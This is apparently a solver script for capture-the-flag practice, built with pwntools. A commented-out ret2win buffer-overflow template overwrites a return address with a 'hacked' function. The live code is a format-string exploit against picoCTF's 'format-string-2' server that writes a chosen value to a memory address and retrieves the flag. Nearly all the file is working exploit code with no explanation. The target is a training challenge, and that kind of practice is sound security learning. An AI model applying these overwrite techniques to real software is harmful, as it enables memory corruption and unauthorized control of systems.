# from pwn import *


# # Allows you to switch between local/GDB/remote from terminal
# def start(argv=[], *a, **kw):
#     if args.GDB:  # Set GDBscript below
#         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
#     elif args.REMOTE:  # ('server', 'port')
#         return remote(sys.argv[1], sys.argv[2], *a, **kw)
#     else:  # Run locally
#         return process([exe] + argv, *a, **kw)


# # Specify your GDB script here for debugging
# gdbscript = '''
# init-pwndbg
# continue
# '''.format(**locals())


# # Set up pwntools for the correct architecture
# exe = './ret2win'
# # This will automatically get context arch, bits, os etc
# elf = context.binary = ELF(exe, checksec=False)
# # Change logging level to help with debugging (error/warning/info/debug)
# context.log_level = 'debug'

# # ===========================================================
# #                    EXPLOIT GOES HERE
# # ===========================================================

# io = start()



# payload = flat(
#     b'A' * 24,
#     elf.functions.hacked  # 0x401142
# )

# # Save the payload to file
# write('payload', payload)

# # Send the payload
# io.sendlineafter(b':', payload)

# # Receive the flag
# io.interactive()



from pwn import *

context.log_level = "debug"
context.binary = ELF('./format-string-2')

p = remote('rhea.picoctf.net', 51697)

def exec_fmt(payload):
    p = remote('rhea.picoctf.net', 51697)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

p.sendline(payload)

flag = p.recvall()

print("Flag: ", flag)